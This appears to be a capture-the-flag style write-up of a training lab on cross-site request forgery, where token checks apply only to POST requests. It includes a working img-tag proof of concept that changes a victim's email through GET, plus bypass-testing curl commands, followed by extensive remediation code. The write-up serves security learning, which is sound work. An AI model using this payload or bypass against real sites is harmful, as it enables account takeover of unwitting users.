# CSRF Where Token Validation Depends on Request Method

**Difficulty:** `PRACTITIONER` | **Category:** `CSRF`

---

## 🎯 Lab Goal

Host an HTML page on the exploit server that uses CSRF to change the viewer's email address by bypassing method-based token validation.

---

## 📋 Lab Description

This lab's email change functionality attempts to block CSRF attacks, but only applies defenses to certain HTTP methods.

---

## 🔎 Reconnaissance

### Initial Access

Logged in with provided credentials:

| Field | Value |
|-------|-------|
| Username | `wiener` |
| Password | `peter` |

### Request Analysis

Intercepted the email change POST request:

```http
POST /my-account/change-email HTTP/2
Host: [lab-id].web-security-academy.net
Cookie: session=JKaYVKrBNE0cv9fBBwtjKxe6BAIsdekd
Content-Type: application/x-www-form-urlencoded

email=wiener3%40normal-user.net&csrf=Rqz5CK0UTjC7BBev3dVGgUEP5TbDVgnm
```

🔍 **Finding:** CSRF token is present and validated in POST requests.

---

## 🧪 Testing & Exploitation

### Step 1: Test CSRF Token Validation

Tested token manipulation on POST requests:

| Test | Result |
|------|--------|
| Delete token value | ❌ Error |
| Remove token parameter | ❌ Error |
| Invalid token | ❌ Error |

**Conclusion:** POST requests properly validate CSRF tokens.

### Step 2: Method Override Attack

Changed HTTP method from POST to GET:

```http
GET /my-account/change-email?email=wiener6%40normal-user.net HTTP/2
Host: [lab-id].web-security-academy.net
Cookie: session=JKaYVKrBNE0cv9fBBwtjKxe6BAIsdekd
```

**Result:** ✅ Email changed successfully without CSRF token!

🚨 **Vulnerability Confirmed:** GET requests bypass CSRF validation.

### Step 3: Craft CSRF Exploit

Created exploit using an image tag (GET request):

```html
<html>
<head>
  <meta charset="utf-8">
  <title>CSRF PoC</title>
</head>
<body>
  <img src="https://[lab-id].web-security-academy.net/my-account/change-email?email=attacker@normal-user.net">
</body>
</html>
```

### Step 4: Deploy Exploit

1. Uploaded HTML to exploit server
2. Delivered to victim
3. Victim's email changed when page loaded

---

## 🚩 Solution

**CSRF Exploit:**
```html
<img src="https://[lab-id].web-security-academy.net/my-account/change-email?email=attacker@normal-user.net">
```

---

## 💡 Key Takeaways

### Flawed Defense Pattern

The application only validates CSRF tokens for POST requests:

```python
# Vulnerable implementation
@app.route('/change-email', methods=['GET', 'POST'])
def change_email():
    if request.method == 'POST':
        # Validate CSRF token
        if not valid_csrf_token(request.form.get('csrf')):
            abort(403)
    
    # Process email change (both GET and POST)
    update_email(request.args.get('email') or request.form.get('email'))
```

### Why This Fails

- **Inconsistent validation** across HTTP methods
- **GET requests** should not change state
- **Method override** bypasses protection
- **Browser makes GET** requests automatically (images, scripts, etc.)

### HTTP Method Security

| Method | Should Change State? | CSRF Protection Needed? |
|--------|---------------------|------------------------|
| GET | ❌ No | N/A (shouldn't modify) |
| POST | ✅ Yes | ✅ Required |
| PUT | ✅ Yes | ✅ Required |
| DELETE | ✅ Yes | ✅ Required |
| PATCH | ✅ Yes | ✅ Required |

---

## 🛡️ Remediation

### 1. Enforce Proper HTTP Methods

**❌ Bad (Accepts GET for state changes):**
```python
@app.route('/change-email', methods=['GET', 'POST'])
def change_email():
    email = request.args.get('email') or request.form.get('email')
    update_email(email)
    return "Email updated"
```

**✅ Good (POST only for state changes):**
```python
@app.route('/change-email', methods=['POST'])
def change_email():
    # Validate CSRF token
    if not valid_csrf_token(request.form.get('csrf')):
        abort(403)
    
    email = request.form.get('email')
    update_email(email)
    return "Email updated"
```

### 2. Consistent CSRF Validation

```python
def require_csrf_token(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        # Apply to ALL methods that change state
        if request.method in ['POST', 'PUT', 'DELETE', 'PATCH']:
            token = request.form.get('csrf_token') or \
                   request.headers.get('X-CSRF-Token')
            
            if not token or token != session.get('csrf_token'):
                abort(403, "Invalid CSRF token")
        
        return f(*args, **kwargs)
    return decorated

@app.route('/change-email', methods=['POST'])
@require_csrf_token
def change_email():
    # Safe to process
    pass
```

### 3. Reject GET for State Changes

```python
@app.before_request
def block_state_changing_gets():
    if request.method == 'GET':
        # Check if endpoint modifies state
        state_changing_endpoints = [
            '/change-email',
            '/delete-account',
            '/transfer-money'
        ]
        
        if request.path in state_changing_endpoints:
            abort(405, "Method Not Allowed")
```

### 4. Framework Configuration

**Django:**
```python
# settings.py
CSRF_USE_SESSIONS = True
CSRF_COOKIE_HTTPONLY = True
CSRF_COOKIE_SAMESITE = 'Strict'

# views.py
from django.views.decorators.http import require_POST
from django.views.decorators.csrf import csrf_protect

@require_POST  # Only allow POST
@csrf_protect  # Validate CSRF token
def change_email(request):
    email = request.POST.get('email')
    # Process email change
```

**Flask:**
```python
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

@app.route('/change-email', methods=['POST'])
def change_email():
    # CSRF automatically validated by extension
    pass
```

### 5. REST API Best Practices

```python
# Proper RESTful design
@app.route('/api/user/email', methods=['PUT'])
@require_auth
@require_csrf
def update_email():
    data = request.get_json()
    update_user_email(current_user.id, data['email'])
    return jsonify({'status': 'success'})

# GET should only retrieve, never modify
@app.route('/api/user/email', methods=['GET'])
@require_auth
def get_email():
    return jsonify({'email': current_user.email})
```

### Testing for Method-Based Bypass

```bash
# Test if GET works when POST is protected
curl -X GET "https://target.com/change-email?email=test@test.com" \
     -H "Cookie: session=abc123"

# Test method override headers
curl -X POST "https://target.com/change-email" \
     -H "X-HTTP-Method-Override: GET" \
     -d "email=test@test.com"
```

---

**Status:** ✅ Solved
